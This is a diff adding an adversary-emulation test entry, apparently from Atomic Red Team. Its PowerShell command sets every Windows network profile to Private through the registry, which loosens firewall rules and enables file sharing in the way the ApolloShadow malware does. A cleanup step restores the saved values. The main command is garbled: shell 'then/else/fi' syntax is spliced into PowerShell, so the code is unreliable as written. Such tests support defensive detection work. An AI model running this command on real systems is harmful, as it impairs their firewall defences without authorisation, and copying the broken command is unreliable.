@@ -1,0 +1,66 @@
+- id: f4e1a3bf-8b50-4967-a225-b6c383019e07
+  name: Set All Network Profiles to Private via Registry
+  description: 'Modifies the Category value under each network profile GUID in
+
+    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles to 0 (Private).
+
+    This relaxes Windows Firewall rules and enables file sharing, a technique used
+    by
+
+    ApolloShadow to reduce lateral movement difficulty. Only profiles not already
+    set to
+
+    Private are modified, and their original values are saved to a backup file for
+    cleanup.
+
+
+    Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1686.003
+    name: 'Disable or Modify System Firewall: Windows Host Firewall'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "$env:TEMP\network_profile_backup.txt") {exit 0} else
+          {exit 1}; then : ; else $profilesPath = "HKLM:\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\NetworkList\Profiles"; Remove-Item "$env:TEMP\network_profile_backup.txt"
+          -ErrorAction SilentlyContinue; Get-ChildItem $profilesPath | ForEach-Object
+          {; $category = (Get-ItemProperty $_.PSPath).Category; "$($_.PSChildName)=$category"
+          | Out-File -Append "$env:TEMP\network_profile_backup.txt"; }; fi; $profilesPath
+          = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles";
+          Get-ChildItem $profilesPath | ForEach-Object {; Set-ItemProperty $_.PSPath
+          -Name Category -Value 0; }'
+        cleanup: $backupFile = "$env:TEMP\network_profile_backup.txt"; if (Test-Path
+          $backupFile) {; Get-Content $backupFile | ForEach-Object {; $parts = $_
+          -split '='; $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\$($parts[0])";
+          Set-ItemProperty $path -Name Category -Value ([int]$parts[1]); }; Remove-Item
+          $backupFile; }
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1686.003
+  - atomic-red-team
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Back up current network profile Category values for cleanup
+
+        '
+      prereq_command: 'if (Test-Path "$env:TEMP\network_profile_backup.txt") {exit
+        0} else {exit 1}
+
+        '
+      get_prereq_command: "$profilesPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\\
+        CurrentVersion\\NetworkList\\Profiles\"\nRemove-Item \"$env:TEMP\\network_profile_backup.txt\"\
+        \ -ErrorAction SilentlyContinue\nGet-ChildItem $profilesPath | ForEach-Object\
+        \ {\n    $category = (Get-ItemProperty $_.PSPath).Category\n    \"$($_.PSChildName)=$category\"\
+        \ | Out-File -Append \"$env:TEMP\\network_profile_backup.txt\"\n}\n"
+    technique_created: '2026-04-14T22:54:05.494Z'
+    atomic_guid: f4e1a3bf-8b50-4967-a225-b6c383019e07
+    import_timestamp: '2026-09-05T06:41:06.415822Z'
